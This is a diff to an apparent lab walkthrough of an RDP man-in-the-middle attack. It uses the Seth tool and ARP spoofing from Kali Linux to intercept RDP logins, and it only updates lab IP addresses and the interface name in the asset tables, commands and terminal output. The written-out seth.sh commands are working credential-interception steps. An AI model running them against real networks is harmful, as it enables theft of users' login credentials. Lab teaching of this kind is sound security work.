@@ -18,7 +18,7 @@ In this attack, we're going to use the following assets. The rest can be left po
 
 | System             | IP Address       | Purpose                                              |
 | ------------------ | ---------------- | ---------------------------------------------------- |
-| Windows RDP client | `192.168.141.128` | System initiating the RDP connection                 |
+| Windows RDP client | `192.168.141.101` | System initiating the RDP connection                 |
 | Kali Linux / Seth  | `192.168.141.137` | Man-in-the-middle and credential interception system |
 | IT Default Gateway | `192.168.141.1` | Second part of the ARP Spoof MITM... (you'll see later)|
 | OT Jumphost / Windows RDP server | `192.168.0.9` | Intended RDP destination                   |
@@ -77,12 +77,12 @@ sudo ./seth.sh <INTERFACE> <ATTACKER IP> <VICTIM IP> <GATEWAY IP|HOST IP> [<COMM
 
 | Argument    | Value            | Purpose                                     |
 | ----------- | ---------------- | ------------------------------------------- |
-| INTERFACE   | `eth1`           | Kali interface on the lab network           |
+| INTERFACE   | `eth0`           | Kali interface on the lab network           |
 | ATTACKER IP | `192.168.141.137` | Kali man-in-the-middle address              |
 | VICTIM IP    | `192.168.141.1` | IT-side gateway (firewall)               |
 
 ```bash
-sudo ./seth.sh eth0 192.168.141.137 192.168.141.128 192.168.141.1
+sudo ./seth.sh eth0 192.168.141.137 192.168.141.101 192.168.141.1
 ```
 
 > **Why `192.168.141.1` and not `192.168.0.9`?**
@@ -92,7 +92,7 @@ Seth will begin listening for a SYN packet.
 
 ```bash
 ──(david㉿kali)-[~/Seth]
-└─$ sudo ./seth.sh eth1 192.168.37.159 192.168.37.134 192.168.37.164
+└─$ sudo ./seth.sh eth0 192.168.141.137 192.168.141.101 192.168.141.1
 ███████╗███████╗████████╗██╗  ██╗
 ██╔════╝██╔════╝╚══██╔══╝██║  ██║   by Adrian Vollmer
 ███████╗█████╗     ██║   ███████║   seth@vollmer.syss.de
@@ -122,7 +122,7 @@ After the user enters their credentials, Seth prints them in plaintext:
 
 ```bash
 ┌──(david㉿kali)-[~/Seth]
-└─$ sudo ./seth.sh eth1 192.168.37.159 192.168.37.134 192.168.37.164
+└─$ sudo ./seth.sh eth0 192.168.141.137 192.168.141.101 192.168.141.1
 ███████╗███████╗████████╗██╗  ██╗
 ██╔════╝██╔════╝╚══██╔══╝██║  ██║   by Adrian Vollmer
 ███████╗█████╗     ██║   ███████║   seth@vollmer.syss.de
